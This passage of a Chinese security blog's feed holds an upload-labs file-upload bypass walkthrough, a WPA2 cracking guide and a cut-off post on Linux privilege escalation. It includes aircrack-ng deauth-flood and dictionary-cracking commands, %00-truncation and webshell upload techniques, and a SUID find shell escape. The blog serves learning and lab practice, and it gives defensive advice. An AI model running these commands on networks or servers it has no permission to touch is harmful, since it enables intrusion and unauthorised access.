	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210427101008990.png&#34; data-size=&#34;507x218&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210427101008990.png&#34;
			width=&#34;507&#34;
			height=&#34;218&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210427101008990_hu535958bb68e5628940f3244ab8dfeefe_19537_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210427101008990_hu535958bb68e5628940f3244ab8dfeefe_19537_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;后端去除点、去空后为shell.php.  可正常解析&lt;/p&gt;
&lt;h2 id=&#34;pass10&#34;&gt;PASS10&lt;/h2&gt;
&lt;p&gt;黑名单，上传.php文件去除了&lt;code&gt;php&lt;/code&gt;后缀&lt;/p&gt;
&lt;p&gt;双写绕过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 239; 
			flex-basis: 574px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210427102037999.png&#34; data-size=&#34;541x226&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210427102037999.png&#34;
			width=&#34;541&#34;
			height=&#34;226&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210427102037999_hu7190eae712f0eaa4d5c171dcf0e45772_19538_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210427102037999_hu7190eae712f0eaa4d5c171dcf0e45772_19538_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass11&#34;&gt;PASS11&lt;/h2&gt;
&lt;p&gt;上传任意后缀失败，白名单&lt;/p&gt;
&lt;p&gt;GET请求中的save_path可控，使用%00截断绕过白名单&lt;/p&gt;
&lt;p&gt;作者提供的linux docker下失败，原因为PHP版本=5.5.38&lt;/p&gt;
&lt;h3 id=&#34;注意&#34;&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&#34;00截断利用条件&#34;&gt;00截断利用条件&lt;/h4&gt;
&lt;p&gt;PHP版本&amp;lt;5.3.4、magic_quotes_gpc=off(magic_quotes_gpc开关作用时间是请求开始时，表示在SQL语句执行前对字符串内容是否进行转义)&lt;/p&gt;
&lt;h4 id=&#34;00截断原理&#34;&gt;00截断原理&lt;/h4&gt;
&lt;p&gt;0x00是字符串的结束标识符；真正发挥作用是在处于路径中并和文件名进行拼接，从而发生截断，成功绕过白名单限制；路径一般可以在URL、Cookie、表单中，对于URL和Cookie而言，浏览器端和服务器端都会进行一次urldecode，这样就会将%00解码转换为字符串结束符，对于表单而言，如果有属性enctype=&amp;ldquo;multipart/form-data&amp;rdquo;(表示不会对表单数据进行编码)，服务端接收到表单数据中的%00并不会urldecode，自然无法转换成结束符，这时候需要手动转为十六进制确保其为结束符&lt;/p&gt;
&lt;h4 id=&#34;form表单enctype属性&#34;&gt;form表单enctype属性&lt;/h4&gt;
&lt;p&gt;application/x-www-form-urlencoded:在发送前编码所有字符(默认)&lt;/p&gt;
&lt;p&gt;multipart/form-data:不对字符编码，或在使用包含文件上传控件的表单时，必须使用该值&lt;/p&gt;
&lt;p&gt;text/plain:空格转换为 &amp;ldquo;+&amp;rdquo; 加号，但不对特殊字符编码&lt;/p&gt;
&lt;h4 id=&#34;综上&#34;&gt;综上&lt;/h4&gt;
&lt;p&gt;确保是路径中使用、在URL or Cookie中直接%00即可、在表单中(enctype=&amp;ldquo;multipart/form-data&amp;rdquo;)需要手动转&lt;/p&gt;
&lt;h2 id=&#34;pass12&#34;&gt;PASS12&lt;/h2&gt;
&lt;p&gt;上传任意后缀失败，白名单&lt;/p&gt;
&lt;p&gt;POST请求中的sava_path可控，不能再使用%00了，因为POST中不会像URL中那样可以解码。在Burp的hex中在路径后添加0x00实现截断&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同11失败了&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass13&#34;&gt;PASS13&lt;/h2&gt;
&lt;p&gt;从文件头中读取图片的相关特征确保上传的为图片类文件&lt;/p&gt;
&lt;p&gt;用图下代码判断文件头&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function getReailFileType($filename){
    $file = fopen($filename, &amp;quot;rb&amp;quot;);
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack(&amp;quot;C2chars&amp;quot;, $bin);   //按照指定格式解二进制数据    
    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
    $fileType = &#39;&#39;;    
    switch($typeCode){      
        case 255216:            
            $fileType = &#39;jpg&#39;;
            break;
        case 13780:            
            $fileType = &#39;png&#39;;
            break;        
        case 7173:            
            $fileType = &#39;gif&#39;;
            break;
        default:            
            $fileType = &#39;unknown&#39;;
        }    
        return $fileType;
}

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GIF绕过，文件头中添加GIF89a&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 208; 
			flex-basis: 500px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135054544.png&#34; data-size=&#34;500x240&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135054544.png&#34;
			width=&#34;500&#34;
			height=&#34;240&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135054544_hu4de751630872fb278acdcf946e161150_20988_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210427135054544_hu4de751630872fb278acdcf946e161150_20988_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;JPG绕过，使用命令生成图片马，再上传即可&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 586; 
			flex-basis: 1408px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135644318.png&#34; data-size=&#34;575x98&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135644318.png&#34;
			width=&#34;575&#34;
			height=&#34;98&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210427135644318_hu8baea5e524e9dda1c3f047a892d95166_2411_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210427135644318_hu8baea5e524e9dda1c3f047a892d95166_2411_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;PNG类似&lt;/p&gt;
&lt;p&gt;**注意：**仅仅只是上传了图片马，需要配合文件包含漏洞才能解析为PHP&lt;/p&gt;
&lt;h2 id=&#34;pass14&#34;&gt;PASS14&lt;/h2&gt;
&lt;p&gt;使用如下代码判断是否为真实图片&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function isImage($filename){
    $types = &#39;.jpeg|.png|.gif&#39;;
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;getimagesize&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
list($width, $height, $type, $attr) = getimagesize(&amp;quot;test.png&amp;quot;);
echo &amp;quot;宽度为：&amp;quot; . $width;
echo &amp;quot;高度为：&amp;quot; . $height;
echo &amp;quot;类型为：&amp;quot; . $type;
echo &amp;quot;属性：&amp;quot; . $attr;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同样可使用PASS13中的图片马绕过&lt;/p&gt;
&lt;h2 id=&#34;pass15&#34;&gt;PASS15&lt;/h2&gt;
&lt;p&gt;使用php_exif模块检测文件类型，同PASS13上传图片马即可&lt;/p&gt;
&lt;h2 id=&#34;pass16&#34;&gt;PASS16&lt;/h2&gt;
&lt;p&gt;进行了二次渲染，具体绕过思路就是比较上传后且渲染过的正常图片和原始图片的区别，在相同的部分插入webshell代码&lt;/p&gt;
&lt;p&gt;参考如下：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/2657#toc-12&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/2657#toc-12&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass17&#34;&gt;PASS17&lt;/h2&gt;
&lt;p&gt;白名单，条件竞争。代码逻辑：先上传上来，再判断是否为白名单类型或者其他判断等，如果非法就立刻删除，如果合法就重命名，即先落地再判断处理&lt;/p&gt;
&lt;p&gt;绕过方法&lt;/p&gt;
&lt;p&gt;初始上传一个shell1.php，内容为生成一个webshell，当shell1.php上传成功后，利用时间差客户端立刻访问该php确保能够生成webshell(可以配合burp不断发送上传包，同时浏览器不断访问shell1.php即可)&lt;/p&gt;
&lt;h2 id=&#34;pass18&#34;&gt;PASS18&lt;/h2&gt;
&lt;p&gt;白名单+条件竞争。代码逻辑：上传上来，做后缀、大小等各种判断后，再重命名&lt;/p&gt;
&lt;p&gt;绕过方法&lt;/p&gt;
&lt;p&gt;上传一个白名单多后缀PHP文件，配合Apache解析漏洞， 不断重放会成功上传而没有被重命名&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 225; 
			flex-basis: 541px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210506193629239.png&#34; data-size=&#34;521x231&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210506193629239.png&#34;
			width=&#34;521&#34;
			height=&#34;231&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210506193629239_hua7cc7c303d3762915c590b945765d6d8_22643_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210506193629239_hua7cc7c303d3762915c590b945765d6d8_22643_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass19&#34;&gt;PASS19&lt;/h2&gt;
&lt;p&gt;上传后保存的文件名完全可控，源码中未处理大小写&lt;/p&gt;
&lt;p&gt;可以大小写绕过，可以利用00截断(CVE-2015-2348 &lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/cyjaysun/p/4390930.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/cyjaysun/p/4390930.html&lt;/a&gt;)，可以利用&lt;strong&gt;move_uploaded_file忽视&amp;quot;/.&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass20&#34;&gt;PASS20&lt;/h2&gt;
&lt;p&gt;审计&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if(!empty($_FILES[&#39;upload_file&#39;])){
    //检查MIME
    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){
        $msg = &amp;quot;禁止上传该类型文件!&amp;quot;;
    }else{
        //检查文件名
        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
        if (!is_array($file)) {
            $file = explode(&#39;.&#39;, strtolower($file));  //save_name参数如果不是数组，就用&amp;quot;.&amp;quot;拆分为数组
        }

        $ext = end($file);
        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
        if (!in_array($ext, $allow_suffix)) {
            $msg = &amp;quot;禁止上传该后缀文件!&amp;quot;;
        }else{
            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];  //reset表示将数组指针移到首位
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = &amp;quot;文件上传成功！&amp;quot;;
                $is_upload = true;
            } else {
                $msg = &amp;quot;文件上传失败！&amp;quot;;
            }
        }
    }
}else{
    $msg = &amp;quot;请选择要上传的文件！&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;审计可知，先判断MIME类型，其再获取save_name，不为数组直接以&amp;quot;.&amp;ldquo;拆分为数组，随后取数组最后位置元素为扩展名，但是重命名文件名时使用了$file[count($file) - 1]，因此绕过方法即为让save_name[0] = test.php 、save_name[2] = jpg ，&lt;strong&gt;则count($file)值为2，$file[count($file) - 1]即为$file[1]&lt;/strong&gt;，为空，最后拼接文件名为&amp;quot;test.php.&amp;quot;，利用多后缀解析即可。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 154; 
			flex-basis: 371px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210507135931992.png&#34; data-size=&#34;571x369&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210507135931992.png&#34;
			width=&#34;571&#34;
			height=&#34;369&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210507135931992_hu85f0e671be5c061b8d90210ec00c48e8_34242_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210507135931992_hu85f0e671be5c061b8d90210ec00c48e8_34242_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也可以利用move_uploaded_file忽视&amp;rdquo;/.&amp;ldquo;绕过，落地后文件名即为shell.php&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 150; 
			flex-basis: 361px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210507141909264.png&#34; data-size=&#34;546x362&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210507141909264.png&#34;
			width=&#34;546&#34;
			height=&#34;362&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210507141909264_hua3089fb2bd45465cab2c27661a6ec397_35330_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210507141909264_hua3089fb2bd45465cab2c27661a6ec397_35330_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;整理&#34;&gt;整理&lt;/h2&gt;
&lt;h3 id=&#34;可解析后缀&#34;&gt;可解析后缀&lt;/h3&gt;
&lt;p&gt;asp/aspx语言：asp、aspx、asa、asax、ascx、ashx、asmx、cer
php语言：php、php5、php4、php3、php2、phtml、pht
jsp语言：jsp、jspa、jspx、jsw、jsv、jspf、jhtml&lt;/p&gt;
&lt;h3 id=&#34;中间件漏洞&#34;&gt;中间件漏洞&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;IIS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IIS 6.0 文件解析 xx.asp;.jpg
IIS 6.0 目录解析 xx.asp/1.jpg
IIS 7.5 畸形解析 xxx.jpg/x.php
&lt;strong&gt;Apache&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;%0a (CVE-2017-15715)
多后缀解析 test.php.xxx
&lt;strong&gt;nginx&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;访问链接加 /xxx.php，即 test.jpg/xxx.php
畸形解析漏洞 test.jpg%00xxx.php
CVE-2013-4547 test.jpg(非编码空格)\0x.php&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;tomcat&lt;/strong&gt;(需要配合Windows特性)&lt;/p&gt;
&lt;p&gt;xxx.jsp/
xxx.jsp%20
xxx.jsp::$DATA&lt;/p&gt;
&lt;h3 id=&#34;系统特性&#34;&gt;系统特性&lt;/h3&gt;
&lt;p&gt;Windows 下 ADS 流特性，导致上传文件 xxx.php::$DATA = xxx.php
Windows 下文件名结尾加入.、空格、&amp;lt;、&amp;gt;、&amp;raquo;&amp;gt;、0x81-0xff等字符，最终生成的文件均被会被Windows 忽略&lt;/p&gt;
&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文件上传目录设置为不可执行（文件上传后做独立存储，做静态文件处理）：web容器无法解析该目录下的文件&lt;/li&gt;
&lt;li&gt;通过白名单判断文件类型（图片可以做压缩和resize处理，破坏其中的可能包含的html或php代码）&lt;/li&gt;
&lt;li&gt;使用随机随改写文件名和文件路径（攻击者不知道路径和改写后的文件名就无法直接访问该文件）&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>破解WiFi密码</title>
        <link>https://coollllllll.github.io/p/wifi/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/wifi/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 破解WiFi密码" /&gt;&lt;h1 id=&#34;破解wifi密码&#34;&gt;破解WiFi密码&lt;/h1&gt;
&lt;h2 id=&#34;基础&#34;&gt;基础&lt;/h2&gt;
&lt;p&gt;WPA2其实是基于WPA的一种新的加密方式。WPA指的是保护无线电脑网络安全系统（Wi-Fi Protected Access），大大增强现有以及未来无线局域网系统的数据保护和访问控制水平。而WPA2是WPA的增强型版本，与WPA相比，WPA2新增了支持AES的加密方式。WPA2其安全性是利用密钥导出函数来增强的，但是使用者采用的典型的弱密也会被密码破解攻击。&lt;/p&gt;
&lt;p&gt;WPA密码其实称为PSK，长度一般是8-63字节，它加上ssid通过哈希算法可以得到PMK，PMK是定长的64字节。由于计算PMK的过程开销比较大，是破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成的。&lt;/p&gt;
&lt;p&gt;在认证的时候会生成一个PTK，这是一组密钥，它的生成方法也是采用哈希，参数是连接的客户端MAC地址、AP的BSSID、A-NONCE、S-NONCE、PMK，其中A-NONCE和S-NONCE是两个随机数，确保每次连接都会生成不同的PTK，PTK的计算消耗很小，PTK加上报文数据采用加密算法（AES或TKIP）得到密文，同时会得到一个签名，叫做MIC（message integrality check）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;破解密码的关键流程：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PMK = SHA-1(SSID, PSK)&lt;/li&gt;
&lt;li&gt;PTK = hash(MAC, BSSID, A-NONCE, S-NONCE, PMK)&lt;/li&gt;
&lt;li&gt;密文 = AES或TKIP(PTK, data)&lt;/li&gt;
&lt;li&gt;签名MIC = HMAC(PTK, 整个802.1x认证报文)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在握手包过程中可以获得的是：&lt;strong&gt;客户端的MAC地址，AP的BSSID，A-NONCE，S-NONE，MIC&lt;/strong&gt;。而认证原理就是客户端算出MIC发给AP，AP也采用相同方法计算并与之比较，若一致则认证通过。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;破解：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;先抓取握手包&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用字典中的PSK+ssid先生成PMK（如果有已经生成好的HASH表则略过）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;结合握手包中的（客户端MAC，AP的BSSID，A-NONCE，S-NONCE）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;通过DeAuth泛洪攻击让连接WiFi的设备断开连接，客户端设备会尝试重联，在这个过程中监听某设备与WiFi重新建立连接时的握手包，其中包含密文密码，随后使用工具破解即可。&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;h3 id=&#34;开启网卡监听&#34;&gt;开启网卡监听&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;airmon-ng start wlan0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;扫描wifi信号&#34;&gt;扫描WiFi信号&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;airodump-ng wlan0mon
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1896; 
			flex-basis: 4551px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/wifi/image-20220214204722612.png&#34; data-size=&#34;550x29&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/wifi/image-20220214204722612.png&#34;
			width=&#34;550&#34;
			height=&#34;29&#34;
			srcset=&#34;https://coollllllll.github.io/p/wifi/image-20220214204722612_hueadd420dfec33d7685bd5dabd63c30f3_19906_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/wifi/image-20220214204722612_hueadd420dfec33d7685bd5dabd63c30f3_19906_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;各个参数含义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BSSID 路由器的 MAC 地址&lt;/li&gt;
&lt;li&gt;PWR 信号的强度，数值越大代表信息越强&lt;/li&gt;
&lt;li&gt;CH 信道&lt;/li&gt;
&lt;li&gt;ENC 加密的方式&lt;/li&gt;
&lt;li&gt;AUTH 认证方式&lt;/li&gt;
&lt;li&gt;ESSID WIFI名字&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;监听流量&#34;&gt;监听流量&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;airodump-ng -w wifi名 -c 信道 --bssid xxxx wlan0mon
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;deauth泛洪攻击&#34;&gt;DeAuth泛洪攻击&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;aireplay-ng -0 0 -a WIFI物理地址 -c 用户设备物理地址 wlan0mon
# 参数
-0 3 表示发送3次，-0 0 表示持续发送；不加 -c 参数表示断开所有客户端的连接
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;暴力破解&#34;&gt;暴力破解&lt;/h3&gt;
&lt;p&gt;查看所拦截的数据包，检测这个包里是否有握手包：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aircrack-ng /tmp/xxx.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;破解：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;aircrack-ng /tmp/xxx.cap -w 字典路径
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Linux 提权</title>
        <link>https://coollllllll.github.io/p/1/</link>
        <pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash.jpg" alt="Featured image of post Linux 提权" /&gt;&lt;h1 id=&#34;linux提权&#34;&gt;Linux提权&lt;/h1&gt;
&lt;h2 id=&#34;suid和sudo提权&#34;&gt;suid和sudo提权&lt;/h2&gt;
&lt;h3 id=&#34;suid&#34;&gt;suid&lt;/h3&gt;
&lt;p&gt;SUID，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Tom)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权。&lt;/p&gt;
&lt;p&gt;一个程序执行时会有三个id状态，分别如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Real User ID：执行这个程序的用户的真实id，以用户登录时候的id为准&lt;/li&gt;
&lt;li&gt;Effective User ID：是程序执行过程中使用权限时真正起作用的用户id，操作系统在检查一个程序有没有某个权限的时候会查看该id&lt;/li&gt;
&lt;li&gt;Saved User ID：程序临时提权时需要保存的先前的用户id，等提权结束后需要回退到这个用户id&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;suid用途&#34;&gt;suid用途&lt;/h4&gt;
&lt;p&gt;如果用户Tom有另一个用户root的程序的执行权限，并且root给这个程序设置了SUID位，那么Tom就可以用root的权限来执行这个程序&lt;/p&gt;
&lt;h4 id=&#34;遍历suid文件&#34;&gt;遍历suid文件&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 174; 
			flex-basis: 418px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211013091410929.png&#34; data-size=&#34;831x477&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211013091410929.png&#34;
			width=&#34;831&#34;
			height=&#34;477&#34;
			srcset=&#34;https://coollllllll.github.io/p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;设置suid&#34;&gt;设置suid&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 设置suid位
chmod 4xxx filename

# 设置sgid位
chmod 2xxx filename

# 设置suid和sgid位
chmod 6xxx filename

其中xxx指的是文件的一般读写执行权限
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;取消suid&#34;&gt;取消suid&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 取消suid和sgid
chmod xxx filename
# 取消suid或sgid
chmod u-s filename or chmod g-s filename
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;注意&#34;&gt;注意&lt;/h4&gt;
&lt;p&gt;suid位只对编译过的可执行程序起作用，比如给某一个sh脚本赋予suid位置，而sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的suid位，就不会起作用了&lt;/p&gt;
&lt;h3 id=&#34;suid提权姿势&#34;&gt;suid提权姿势&lt;/h3&gt;
&lt;h4 id=&#34;find&#34;&gt;find&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find . -exec /bin/sh -p \; -quit
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意:前提都是find可执行文件具备suid&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其他类似的：https://gtfobins.github.io/&lt;/p&gt;
&lt;h3 id=&#34;sudo&#34;&gt;sudo&lt;/h3&gt;
&lt;p&gt;sudo权限是把本来只能超级用户执行的命令&lt;strong&gt;赋予普通用户执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要配置sudo，需要修改/etc/sudoers&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# sudoers文件对某个用户或用户组的sudo配置

授权用户/组 主机   =[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...
字段1      字段2   字段3                字段4              字段5

# 字段1
不以%开头表示授权用户； 以%开头表示授权用户组
# 字段2
表示允许登录的主机；ALL表示所有;如果该字段不为ALL,表示授权用户只能在某些机器上登录本服务器来执行sudo命令
# 字段3
如果省略, 相当于(root:root)，表示可以通过sudo提权到root; 如果为(ALL)或者(ALL:ALL), 表示能够提权到(任意用户:任意用户组)
# 字段4
可能取值是NOPASSWD:，注意NOPASSWD后面带有冒号:，表示执行sudo时可以不需要输入密码
# 字段5
用逗号分开一系列命令，ALL表示允许所有操作
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sudo -l可查看自己的sudo配置&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 450; 
			flex-basis: 1080px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211012170101086.png&#34; data-size=&#34;621x138&#34;&gt;
